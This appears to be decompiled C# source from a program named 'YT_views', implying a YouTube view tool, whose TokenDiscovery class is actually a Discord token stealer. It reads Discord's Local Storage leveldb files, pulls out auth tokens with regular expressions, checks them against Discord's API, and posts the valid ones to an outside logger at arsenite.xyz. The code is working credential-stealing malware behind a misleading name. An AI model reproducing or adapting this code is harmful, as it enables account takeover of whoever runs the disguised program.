using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace YT_views
{
	// Token: 0x02000005 RID: 5
	internal class TokenDiscovery
	{
		// Token: 0x0600000D RID: 13 RVA: 0x00002450 File Offset: 0x00000650
		private static string Extract(string source, string searchString, char endAt)
		{
			return source.Substring(source.IndexOf(searchString) + searchString.Length).Split(new char[]
			{
				endAt
			})[0];
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002488 File Offset: 0x00000688
		public static List<string> FindTokens(string path)
		{
			List<string> list = new List<string>();
			foreach (string text in Directory.GetFiles(path + "\\Local Storage\\leveldb"))
			{
				bool flag = text.EndsWith(".log") || text.EndsWith(".ldb");
				if (flag)
				{
					try
					{
						string text2 = text + "-c";
						bool flag2 = File.Exists(text2);
						if (flag2)
						{
							File.Delete(text2);
						}
						File.Copy(text, text2);
						string input = File.ReadAllText(text2);
						foreach (object obj in Regex.Matches(input, "mfa\\.(\\w|\\d|_|-){84}"))
						{
							Match match = (Match)obj;
							list.Add(match.Value);
						}
						foreach (object obj2 in Regex.Matches(input, "(\\w|\\d){24}\\.(\\w|\\d|_|-){6}.(\\w|\\d|_|-){27}"))
						{
							Match match2 = (Match)obj2;
							list.Add(match2.Value);
						}
					}
					catch
					{
					}
				}
			}
			return list.Distinct<string>().ToList<string>();
		}

		// Token: 0x0600000F RID: 15 RVA: 0x0000260C File Offset: 0x0000080C
		public static List<string> CheckTokens(List<string> tokens)
		{
			Dictionary<ulong, string> dictionary = new Dictionary<ulong, string>();
			using (List<string>.Enumerator enumerator = tokens.GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					string value = enumerator.Current;
					for (;;)
					{
						try
						{
							HttpResponseMessage result = new HttpClient
							{
								DefaultRequestHeaders = 
								{
									{
										"Authorization",
										value
									}
								}
							}.GetAsync("https://discord.com/api/v8/users/@me").Result;
							bool flag = result.StatusCode == HttpStatusCode.OK;
							if (flag)
							{
								string result2 = result.Content.ReadAsStringAsync().Result;
								dictionary[ulong.Parse(TokenDiscovery.Extract(result2, "\"id\":", ',').Replace("\"", ""))] = value;
							}
						}
						catch
						{
						}
					}
				}
			}
			return dictionary.Values.ToList<string>();
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002718 File Offset: 0x00000918
		public static void ReportToken(string token)
		{
			for (;;)
			{
				try
				{
					HttpResponseMessage result = TokenDiscovery._httpClient.PostAsync("https://arsenite.xyz/logger/" + Config.Id + "/report", new StringContent("{\"token\":\"" + token + "\"}", Encoding.UTF8, "application/json")).Result;
					bool flag = result.StatusCode < HttpStatusCode.BadRequest;
					if (flag)
					{
						break;
					}
					bool flag2 = result.StatusCode < HttpStatusCode.InternalServerError;
					if (flag2)
					{
						string result2 = result.Content.ReadAsStringAsync().Result;
						int num = int.Parse(TokenDiscovery.Extract(result2, "\"code\":", ','));
						bool flag3 = num == 1 || num == 2;
						if (flag3)
						{
							break;
						}
						bool flag4 = num == 3;
						if (flag4)
						{
							int millisecondsTimeout = int.Parse(TokenDiscovery.Extract(result2, "\"retry_after\":", ','));
							Thread.Sleep(millisecondsTimeout);
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x04000008 RID: 8
		private static readonly HttpClient _httpClient = new HttpClient();
	}
}
